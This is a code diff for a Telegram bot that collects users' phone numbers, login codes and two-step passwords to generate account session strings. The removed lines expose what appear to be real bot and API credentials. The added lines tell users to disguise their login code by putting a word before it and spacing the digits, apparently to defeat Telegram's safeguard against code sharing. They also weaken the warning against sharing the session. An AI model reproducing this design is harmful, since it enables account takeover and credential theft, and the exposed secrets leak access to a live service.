@@ -1,6 +1,7 @@
 import os
 import re
 import asyncio
+from dotenv import load_dotenv
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
 from pyromod import listen
@@ -9,12 +10,18 @@ from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 
-# --- CONFIGURATION ---
-BOT_TOKEN = "8701869062:AAFTGGGkI-pg2ZyWkq9e7mRhvR5Q9jGDwuk"
-API_ID = "37133457"
-API_HASH = "951a895d6016c9d88880f9591209dbc2"
+# Load environment variables securely from .env file
+load_dotenv()
 
-bot = Client("SessionGeneratorBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+# --- CONFIGURATION ---
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+API_ID = os.getenv("API_ID")
+API_HASH = os.getenv("API_HASH")
+
+if not all([BOT_TOKEN, API_ID, API_HASH]):
+    raise ValueError("Missing configuration! Ensure your .env file has BOT_TOKEN, API_ID, and API_HASH.")
+
+bot = Client("SessionGeneratorBot", api_id=int(API_ID), api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start_command(client, message):
@@ -35,7 +42,6 @@ async def generate_session(client, callback_query):
     
     await callback_query.answer()
     
-    # 1. Ask for Phone Number using a Contact Request Button
     contact_keyboard = ReplyKeyboardMarkup(
         [[KeyboardButton("📱 Share Phone Number", request_contact=True)]],
         resize_keyboard=True,
@@ -44,7 +50,7 @@ async def generate_session(client, callback_query):
     
     await bot.send_message(
         chat_id, 
-        f"**Starting {lib_type.capitalize()} Session Generation...**\n\n"
+        f"**Starting {lib_type.capitalize()} Session...**\n\n"
         "Please tap the **📱 Share Phone Number** button below, or type it manually with the country code (e.g., +91...):",
         reply_markup=contact_keyboard
     )
@@ -52,13 +58,11 @@ async def generate_session(client, callback_query):
     try:
         phone_msg = await bot.listen(chat_id, timeout=300)
         
-        # Check if they used the button or typed it manually
         if phone_msg.contact:
             phone_number = phone_msg.contact.phone_number
         else:
             phone_number = phone_msg.text.replace(" ", "")
             
-        # Hide the big keyboard
         await bot.send_message(chat_id, f"📲 Phone number received: `{phone_number}`\nProcessing...", reply_markup=ReplyKeyboardRemove())
 
         if lib_type == "pyrogram":
@@ -72,7 +76,7 @@ async def generate_session(client, callback_query):
         await bot.send_message(chat_id, f"**Error:** `{e}`", reply_markup=ReplyKeyboardRemove())
 
 async def generate_pyrogram(chat_id, api_id, api_hash, phone_number):
-    user_client = Client(":memory:", api_id=api_id, api_hash=api_hash)
+    user_client = Client(":memory:", api_id=int(api_id), api_hash=api_hash)
     await user_client.connect()
     
     try:
@@ -80,21 +84,22 @@ async def generate_pyrogram(chat_id, api_id, api_hash, phone_number):
         await bot.send_message(
             chat_id, 
             "✅ **Code sent!** Check your Telegram messages.\n\n"
-            "Send the OTP below. *(You can send it normally like `12345` or with spaces `1 2 3 4 5`)*"
+            "⚠️ **SECURITY RULE:** Do NOT send the code directly!\n"
+            "👉 **Add a word before the code.**\n"
+            "Example: If your code is `12345`, send it as `code 1 2 3 4 5`."
         )
         
         otp_msg = await bot.listen(chat_id, timeout=300)
-        # Extracts only the digits so it works with or without spaces/dashes
         otp = re.sub(r'\D', '', otp_msg.text) 
         
         try:
             await user_client.sign_in(phone_number, code_info.phone_code_hash, otp)
         except SessionPasswordNeeded:
-            await bot.send_message(chat_id, "🔐 **2FA is enabled!**\n\nPlease send your Two-Step Verification password:")
+            await bot.send_message(chat_id, "🔐 **2FA is enabled!**\n\nPlease send your password:")
             pwd_msg = await bot.listen(chat_id, timeout=300)
             await user_client.check_password(pwd_msg.text)
         except PhoneCodeExpired:
-            await bot.send_message(chat_id, "❌ **Error:** The OTP code has expired. Please type /start to try again.")
+            await bot.send_message(chat_id, "❌ **Error:** Code expired! You probably didn't add a word before the numbers. Type /start to try again.")
             return
             
         session_string = await user_client.export_session_string()
@@ -106,7 +111,7 @@ async def generate_pyrogram(chat_id, api_id, api_hash, phone_number):
         await user_client.disconnect()
 
 async def generate_telethon(chat_id, api_id, api_hash, phone_number):
-    client = TelegramClient(StringSession(), api_id, api_hash)
+    client = TelegramClient(StringSession(), int(api_id), api_hash)
     await client.connect()
     
     try:
@@ -114,7 +119,9 @@ async def generate_telethon(chat_id, api_id, api_hash, phone_number):
         await bot.send_message(
             chat_id, 
             "✅ **Code sent!** Check your Telegram messages.\n\n"
-            "Send the OTP below. *(You can send it normally like `12345` or with spaces `1 2 3 4 5`)*"
+            "⚠️ **SECURITY RULE:** Do NOT send the code directly!\n"
+            "👉 **Add a word before the code.**\n"
+            "Example: If your code is `12345`, send it as `code 1 2 3 4 5`."
         )
         
         otp_msg = await bot.listen(chat_id, timeout=300)
@@ -123,16 +130,16 @@ async def generate_telethon(chat_id, api_id, api_hash, phone_number):
         try:
             await client.sign_in(phone_number, code_info.phone_code_hash, otp)
         except SessionPasswordNeededError:
-            await bot.send_message(chat_id, "🔐 **2FA is enabled!**\n\nPlease send your Two-Step Verification password:")
+            await bot.send_message(chat_id, "🔐 **2FA is enabled!**\n\nPlease send your password:")
             pwd_msg = await bot.listen(chat_id, timeout=300)
             await client.sign_in(password=pwd_msg.text)
         except PhoneCodeExpiredError:
-            await bot.send_message(chat_id, "❌ **Error:** The OTP code has expired. Please type /start to try again.")
+            await bot.send_message(chat_id, "❌ **Error:** Code expired! You probably didn't add a word before the numbers. Type /start to try again.")
             return
             
         session_string = client.session.save()
         
-        temp_pyro = Client(":memory:", api_id=api_id, api_hash=api_hash, session_string=session_string)
+        temp_pyro = Client(":memory:", api_id=int(api_id), api_hash=api_hash, session_string=session_string)
         await temp_pyro.connect()
         await send_session(chat_id, session_string, "Telethon", temp_pyro)
         await temp_pyro.disconnect()
@@ -143,10 +150,10 @@ async def generate_telethon(chat_id, api_id, api_hash, phone_number):
         await client.disconnect()
 
 async def send_session(chat_id, session_string, lib_type, user_client):
-    text = f"**{lib_type} String Session**\n\n`{session_string}`\n\n**⚠️ Keep this private! Do not share it with anyone!**"
+    text = f"**{lib_type} String Session**\n\n`{session_string}`\n\n**⚠️ Keep this private!**"
     try:
         await user_client.send_message("me", text)
-        await bot.send_message(chat_id, "🎉 **Success!** Your string session has been securely sent to your **Saved Messages**.")
+        await bot.send_message(chat_id, "🎉 **Success!** Your string session has been sent to your **Saved Messages**.")
     except Exception:
         await bot.send_message(chat_id, f"**Success!** Here is your session:\n\n`{session_string}`")
 
